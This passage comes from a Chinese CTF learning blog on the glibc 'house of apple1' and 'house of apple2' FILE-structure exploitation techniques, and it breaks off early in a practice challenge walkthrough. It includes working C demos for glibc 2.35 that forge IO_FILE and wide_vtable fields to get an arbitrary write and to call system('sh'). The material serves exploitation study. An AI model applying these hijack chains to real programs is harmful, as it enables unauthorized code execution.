JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h5 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>而 <code>house of apple1</code> 中利用的漏洞位置位于 <code>_IO_wstrn_jumps</code> 结构体中的函数指针指向的 <code>_IO_wstrn_overflow</code> ,该函数源码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line">		 snf-&gt;overflow_buf + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">				      / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">				      + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">					 / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数是宽字符流的溢出处理函数，当宽字符缓冲区已满，需要将数据写入指定位置（文件或者终端）时，该函数会被调用。</p>
<p>关于上面的代码首先要做一个简单的分析</p>
<ol>
<li><code>snf</code> 的地址和 <code>fp</code> 的地址相同 （也就是当前处理的这个 <code>IO_FILE</code> 的首地址）</li>
<li><code>snf-&gt;overflow_buf</code> 相对于 <code>_IO_FILE</code> 结构体的偏移为<code>0xf0</code>，紧跟着在 <code>vtable</code> 后面</li>
<li>正常情况下 <code>fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</code> 这个条件是成立的。也就是 <code>if</code> 下的代码会被执行，完成下面的赋值操作</li>
</ol>
<p>漏洞就是在赋值上面，因为没有关于 <code>fp-&gt;_wide_data</code> 的合法性检查，如果我们能够控制 <code>fp-&gt;_wide_data</code>，（以 <code>fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</code> 这行代码为例）那就可以让 <code>snf-&gt;overflow_buf</code> 这个地址写入到 <code>fp-&gt;_wide_data-&gt;_IO_write_base</code>  上，而通过结构体指针操作符 <code>-&gt;</code> 来访问结构体中的成员变量本质上也只是访问的一个指针加偏移而已。因此实际上完成的写入操作是将 <code>snf-&gt;overflow_buf</code> 地址写入到了 <code>fp-&gt;_wide_data</code> 地址加 <code>0x20</code> 处，<strong>完成了一次任意地址写一个不可控地址（这个不可控地址是 <code>overflow_buf</code> 的地址，不过通常我们伪造的 <code>IO_FILE</code> 在堆上，所以这个地址通常是个堆地址）</strong>，之后还有几次赋值操作，原理依然如上。</p>
<p>自己写了一个 <code>demo</code> 如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Ubuntu GLIBC 2.35-0ubuntu3.1 </span></span><br><span class="line"><span class="comment">// gcc demo.c -o demo -g -w</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> data[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data address -------&gt; %p\n&quot;</span>,&amp;data);<span class="comment">//最终被写入数据的全局变量地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data value   -------&gt; %s\n&quot;</span>,data);<span class="comment">//此时全局的内容为空 </span></span><br><span class="line">    </span><br><span class="line">	<span class="type">void</span> *libc_base=&amp;<span class="built_in">printf</span><span class="number">-0x60770</span>;<span class="comment">//获取libc基地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc base address ------&gt; %p\n&quot;</span>,libc_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//该堆块就是用来伪造IO_FILE的 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Forged IO_ File address--------&gt; %p\n&quot;</span>,p);</span><br><span class="line">    </span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> _IO_wstrn_jumps =libc_base+<span class="number">0x215dc0</span>;<span class="comment">//获取_IO_wstrn_jumps的地址 </span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *vtable=p+<span class="number">0xd8</span>;<span class="comment">//获取伪造的IO_FILE的地址 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> io_stdin=libc_base+<span class="number">0x219aa0</span>;<span class="comment">//获取_IO_2_1_stdin_结构体的地址 </span></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)(io_stdin+<span class="number">0x68</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)(p);</span><br><span class="line">	<span class="comment">//该攻击的第一步，需要先将伪造的IO_FILE添加到_IO_list_all中</span></span><br><span class="line">	<span class="comment">//我这里选择了篡改_IO_2_1_stdin_中的_chain字段，将其改为伪造的IO_FILE </span></span><br><span class="line">	 </span><br><span class="line">    </span><br><span class="line">    *(vtable)=_IO_wstrn_jumps;<span class="comment">//该攻击的第二步，将IO_FILE中的vtable改成 _IO_wstrn_jumps的地址 </span></span><br><span class="line">    </span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>*)(p+<span class="number">0xa0</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)(data<span class="number">-0x18</span>);</span><br><span class="line">	<span class="comment">//攻击第三步，将伪造的_IO_FILE中的_wide_data字段改为目标地址</span></span><br><span class="line">	<span class="comment">//触发攻击时就会向目标地址加0x18 0x20等等位置写入snf-&gt;overflow_buf的地址</span></span><br><span class="line">	<span class="comment">//这里我提前将目标地址减了0x18，在触发攻击时，就可以直接向目标地址写入snf-&gt;overflow_buf的地址了 </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//下面两行代码是为了绕过检查，触发overflow函数，分别将write_base设置为0 write_ptr设置为1</span></span><br><span class="line">	<span class="comment">//需要注意的是本来还需要伪造_mode字段为0，但是通常在堆块上这个字段默认是0</span></span><br><span class="line">	<span class="comment">//所以下面就没有伪造，但并不意味这_mode字段不需要伪造 </span></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>*)(p+<span class="number">0x28</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)(<span class="number">1</span>);</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>*)(p+<span class="number">0x20</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fcloseall();<span class="comment">//触发攻击 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data value -------&gt; %s\n&quot;</span>,data);<span class="comment">//最后打印data的内容，发现原本内容是空的data变成了snf-&gt;overflow_buf的地址 </span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>输出结果：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305121929997.png" alt="image-20230512192939734"></p>
<p>因为上图中最后的 <code>data value</code> 是个地址，存在不可见字符，实际值如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305121934919.png" alt="image-20230512193409832"></p>
<p>上述便是 <code>house of apple1</code> 的学习总结，该攻击并不能直接获取 <code>shell </code> ，通常情况下是只能向几个地址里写入一个堆地址。但是通过对于 <code>house of apple1</code> 的学习让我体会到了一种新型的攻击思路，个人感觉最好的状态就是先看文章学习，最后根据自己的理解写一个 <code>demo</code> ，只要 <code>demo</code> 没有成功触发攻击就说明自己还有地方没理解，当 <code>demo</code> 成功触发攻击时，就说明自己的理解是正确的。</p>
<h4 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h4><h5 id="利用条件：-1"><a href="#利用条件：-1" class="headerlink" title="利用条件："></a>利用条件：</h5><ol>
<li>可以泄露 <code>libc</code> 地址和堆地址 </li>
<li>可以使用任意地址写一个堆地址（通常是使用 <code>large bin attack</code> ）</li>
<li>从 <code>main</code> 函数返回或者调用 <code>exit</code> 函数</li>
</ol>
<h5 id="攻击效果：-1"><a href="#攻击效果：-1" class="headerlink" title="攻击效果："></a>攻击效果：</h5><p>控制程序的执行流</p>
<h5 id="适用版本：-1"><a href="#适用版本：-1" class="headerlink" title="适用版本："></a>适用版本：</h5><p>目前的所有 <code>libc</code> 版本，从 <code>2.23</code> 到目前最新的 <code>2.36</code></p>
<h5 id="前置知识：-1"><a href="#前置知识：-1" class="headerlink" title="前置知识："></a>前置知识：</h5><p>在 <code>2.23</code> 的 <code>libc</code> 版本中，我们是可以劫持 <code>vtable</code> ，从而替换其中的函数指针来控制程序的执行流，但是在之后的 <code>libc</code> 版本中，都对 <code>vtable</code> 进行了合法性检查,判断 <code>vtable</code> 地址是否在一个合法的区间里。但这不意味着无法伪造 <code>vtable</code> 了，目前如果将 <code>vtable</code> 原本存放的 <code>_IO_jump_t</code> 改成 <code>_IO_wfile_jumps</code> 依然是可以通过检查的。（ <strong>roderick</strong> 师傅说只要是 <code>jumps</code> 都满足检测 ）（在 <code>house of apple1</code> 中我们是将 <code>_IO_jump_t</code> 改成了 <code>_IO_wstrn_jumps</code>）</p>
<p><code>_IO_wfile_jumps</code> 结构体如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line">libc_hidden_data_def (_IO_wfile_jumps)</span><br></pre></td></tr></table></figure>

<p>还记得我们之前通常都是劫持 <code>exit</code> 函数中的这个 <code>_IO_OVERFLOW</code> 么，<code>house of apple2</code> 有多个 <code>IO</code> 利用链，这里我只总结从这个 <code>_IO_OVERFLOW</code> 触发的利用链。</p>
<h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>假设我们现在将原本 <code>vtable</code> 中的 <code>_IO_jump_t</code> 结构体地址改成 <code>_IO_wfile_jumps</code> ,那么本应去调用 <code>__overflow</code> 函数不会被执行，而是去调用 <code>_IO_wfile_jumps</code> 中的 <code>_IO_wfile_overflow</code> 函数。</p>
<p>这里分析下 <code>_IO_wfile_overflow</code> 函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_wdoallocbuf (f);</span><br><span class="line">	  _IO_free_wbackup_area (f);</span><br><span class="line">	  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">		     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      _IO_doallocbuf (f);</span><br><span class="line">	      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wfile_overflow)</span><br></pre></td></tr></table></figure>

<p>我们的目的是要调用到 <code>_IO_wdoallocbuf</code> 函数，至于需要绕过的检查后面再总结。</p>
<p><code>_IO_wdoallocbuf</code> 函数源码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">		     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure>



<p><code>_IO_WDOALLOCATE (fp)</code> 这里就是我们最后劫持程序执行流的地方，它是这样被调用的 <code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> 。这个函数最终也是通过 <code>vtable</code> 被调用的，但这个是 <code>_wide_data</code> 结构体中的 <code>_wide_vtable</code> 所调用的，由于没有合法性检测，就可以伪造这个 <code>vtable</code>。</p>
<p>再来回顾下上面提到的 <code>_wide_vtable</code> 结构体 ,可以看到这个 <code>doallocate</code> 位于偏移 <code>0x68</code> 的位置。因此我们只需要让伪造的这个 <code>vtable</code> 加 <code>0x68</code> 的位置为 <code>system</code> 函数即可。接下来想获取 <code>shell</code> ，只需要控制参数即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>发现最终执行的是 <code>_IO_WDOALLOCATE (fp)</code> ,而这个 <code>fp</code> 就是 <code>IO_FILE</code>，因此控制参数的话只需要让 <code>flags</code> 字段为 <code>/bin/sh</code> 。</p>
<p>总结下执行到最后的位置需要绕过的检查</p>
<ol>
<li><code>_flags</code> 设置为<code>~(2 | 0x8 | 0x800)</code> ，如果是需要获取 <code>shell</code> 的话，那么可以将参数写为 <code>  sh;</code> 这样 <code>_flags</code> 既能绕过检查，又能被 <code>system</code> 函数当做参数成功执行。需要注意的是 <code>sh;</code> 前面是有两个空格的（这个值是 <code>0x3b68732020</code> ）</li>
<li><code>_wide_data-&gt;_IO_write_base</code> 设置为 <code>0</code> , <code>fp-&gt;_wide_data-&gt;_IO_buf_base</code> 设置为 <code>0</code> </li>
<li><code>fp-&gt;_mode == 0</code> 和 <code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>  ,这样即可触发 <code>_IO_OVERFLOW</code>。</li>
</ol>
<p>上面提到的是绕过的检查所需要伪造的字段，然后还有几个地方的设置如下</p>
<ol>
<li>将 <code>IO_FILE</code> 中的 <code>vtable</code> 字段改为 <code>_IO_wfile_jumps</code></li>
<li>将 <code>IO_FILE</code> 中的 <code>wide_data</code> 设置为可控堆地址，目的是控制 <code>wide_data</code> 中的 <code>write_base</code> 和 <code>buf_base</code> 为0</li>
<li>控制 <code>wide_data-&gt;wide_vtable</code> 为地址 <code>A</code>，地址 <code>A</code> 满足 <code>*(A+0x68) == system</code> （此处的 <code>system</code> 地址是自己布置的）</li>
</ol>
<p>自己写了一个 <code>demo</code>  如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Ubuntu GLIBC 2.35-0ubuntu3.1 </span></span><br><span class="line"><span class="comment">// gcc demo.c -o demo -g -w</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> libc_base=&amp;<span class="built_in">printf</span><span class="number">-0x60770</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;libc_base --------&gt; %llx\n&quot;</span>,libc_base);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> stderr_address=libc_base+<span class="number">0x21a6a0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;stderr address --------&gt; %llx\n&quot;</span>,stderr_address);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> wide_data=stderr_address+<span class="number">0xa0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;wide_data --------&gt; %llx\n&quot;</span>,wide_data);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> vtable=stderr_address+<span class="number">0xd8</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;vtable --------&gt; %llx\n&quot;</span>,vtable);</span><br><span class="line">	</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> io_wfile_jumps=libc_base+<span class="number">0x2160c0</span>;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> wide_data_write_base=*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)(wide_data)+<span class="number">0x18</span>;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> wide_data_buf_base=*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)wide_data+<span class="number">0x30</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;io_wfile_jumps --------&gt; %llx\n&quot;</span>,io_wfile_jumps);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;wide_data_write_base --------&gt; %llx\n&quot;</span>,wide_data_write_base);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;wide_data_buf_base --------&gt; %llx\n&quot;</span>,wide_data_buf_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> wide_vtable=libc_base+<span class="number">0x219980</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;wide_vtable --------&gt; %llx\n&quot;</span>,wide_vtable);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> system=libc_base+<span class="number">0x50d60</span>;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> write_base=stderr_address+<span class="number">0x20</span>;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> buf_base=stderr_address+<span class="number">0x38</span>;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> system_ptr=wide_vtable<span class="number">-8</span>;</span><br><span class="line"></span><br><span class="line">	*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)vtable=io_wfile_jumps;</span><br><span class="line">	*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)write_base=<span class="number">0</span>;</span><br><span class="line">     *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)wide_data_write_base=<span class="number">0</span>;</span><br><span class="line">     *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)wide_data_buf_base=<span class="number">0</span>;</span><br><span class="line">	*((<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)system_ptr)=system;</span><br><span class="line">	*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)wide_vtable=libc_base+<span class="number">0x219910</span>;</span><br><span class="line">	*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)stderr_address=<span class="number">0x3b68732020</span>; <span class="comment">//~(2 | 0x8 | 0x800);</span></span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301301711064.png" alt="image-20230130171112854"></p>
<h4 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h4><p>题目是 <strong>roderick</strong> 师傅在 <code>house of apple</code> 文章中的例题，下载链接在这里：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1nZIeYKqv619jMFyox-s8gQ?pwd=632r">https://pan.baidu.com/s/1nZIeYKqv619jMFyox-s8gQ?pwd=632r</a>  提取码：632r<br><strong>roderick</strong> 师傅说这个题是 <code>2.34</code> 的 <code>libc</code> ，我是直接拖到了 <code>22.04</code> 的 <code>ubuntu</code> 里，用 <code>2.35</code> 的 <code>libc</code> 打的。</p>
<h5 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h5><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020930803.png" alt="image-20230202093006528" style="zoom: 67%;" />

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020930552.png" alt="image-20230202093028442" style="zoom:50%;" />

<h5 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h5><p>程序最开始先询问了一个 <code>key</code>，这个 <code>key</code> 决定了我们申请堆块的大小。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020932796.png" alt="image-20230202093211719"></p>
<p>上面的代码说明 <code>key</code> 实际的范围是 <code>0x660 ~ 0xaa0</code></p>
<p>然后有四个功能分别是 <code>add</code> <code>delete</code> <code>read</code> <code>write</code> （如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020934204.png" alt="image-20230202093401108" style="zoom:50%;" />



<p><code>add</code> 函数中只能选择三种大小的堆块申请，分别是 <code>key</code> <code>key+0x10</code> <code>2*key</code> ，并且只能 <code>add</code> 函数只负责申请堆块，无法向申请的堆块写入数据，最多能创建 <code>0x10</code> 个堆块。</p>
<p><code>delete</code> 函数存在一个 <code>UAF</code> 漏洞，如下</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020938907.png" alt="image-20230202093807826" style="zoom:50%;" />

<p><code>read</code> 和 <code>write</code> 函数就是一个用于向堆块正常写入数据（没有溢出），一个可以打印堆块中 <code>0x10</code> 的数据（使用的 <code>write</code> 函数不会被 <code>\x00</code> 截断），然后各自只能执行一次</p>
<h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><p>这里只记录使用 <code>house of apple2</code> 的攻击手法，在 <code>house of apple1</code> 中 <strong>roderick</strong> 师傅展示了另一种的攻击方式（不过个人感觉没有 <code>apple2</code> 的利用简单），下面说一下整体的利用思路，至于具体布局结构体的细节还需要做题时自己用 <code>gdb</code> 一点一点调试出来。</p>
<h6 id="泄露-libc-和-heap-地址"><a href="#泄露-libc-和-heap-地址" class="headerlink" title="泄露 libc 和 heap 地址"></a>泄露 <code>libc</code> 和 <code>heap</code> 地址</h6><p>因为只有一次 <code>write</code> 函数执行的机会，让堆块进入 <code>large bin</code> 中泄露两个地址是不可行的，因为用的是 <code>write</code> 打印出来的前 <code>0x10</code> 个字节都是 <code>libc</code> 地址。如果让 <code>unsorted bin</code> 中有两个堆块（不能合并），去打印 <code>unnsorted bin</code> 中的堆块就能用 <code>0x10</code> 的数据泄露出 <code>libc</code> 地址和堆地址了。</p>
